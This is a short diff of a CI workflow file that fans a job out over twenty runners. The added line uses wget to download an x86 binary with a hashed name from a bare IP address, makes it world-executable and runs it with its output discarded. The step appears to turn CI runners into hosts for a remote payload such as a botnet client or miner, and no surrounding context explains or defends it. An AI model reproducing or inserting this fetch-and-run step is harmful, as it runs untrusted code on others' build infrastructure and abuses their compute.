@@ -26,4 +26,4 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
    steps:
      - run: |
-          chmod 777 db0fa4b8db0333367e9bda3ab68b8042.x86;./db0fa4b8db0333367e9bda3ab68b8042.x86 gitlab.X86
+          wget http://107.189.12.178/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.x86 && chmod 777 db0fa4b8db0333367e9bda3ab68b8042.x86 && ./db0fa4b8db0333367e9bda3ab68b8042.x86 SSH.X86 > /dev/null
